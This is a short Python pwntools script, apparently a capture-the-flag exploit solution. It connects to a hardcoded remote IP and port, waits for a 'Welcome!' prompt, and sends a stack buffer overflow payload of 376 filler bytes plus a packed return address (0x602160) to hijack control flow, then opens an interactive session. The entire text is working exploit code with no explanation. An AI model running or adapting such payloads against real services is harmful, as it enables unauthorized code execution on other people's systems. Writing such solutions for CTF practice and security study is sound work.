from pwn import *
context(log_level="debug")
#p = remote('127.0.0.1',5555)
p = remote('218.2.197.234',2090)
p.recvuntil("Welcome!\n")
p.send("a"*376+p64(0x602160))
p.interactive()